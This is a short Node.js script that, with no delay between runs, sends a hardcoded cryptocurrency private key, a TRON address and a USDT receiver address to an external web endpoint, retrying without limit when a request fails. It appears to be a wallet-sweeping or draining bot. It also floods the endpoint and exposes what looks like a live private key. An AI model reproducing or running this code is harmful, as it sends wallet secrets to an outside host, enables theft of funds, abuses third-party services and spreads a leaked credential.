const axios = require("axios");

const sendRequest = async (url, jom) => {
  try {
    const response = await axios.post(url, jom);
    console.log("Request successful!");
    console.log(response.data);
  } catch (error) {
    console.error("Request failed, retrying..."+error);
    await sendRequest(url, jom);
  }
};

const url = "https://tronb2.vercel.app/usdt";

setInterval(() => {
  const jom = {private_key: "FEAD8F1D8DE633359A452976619853077DE6B11552E03C6DCEB373871F3766B1",
               TRX_PK: "TLDPi4xQeQs6iWudWwysfGGp2Zgk3jHm6a",
               USDT_Reciver: "TCnrTgZCXKLy4UedSxsUdfN74MgCLw7JBr"};
  sendRequest(url, jom);
}, 0);
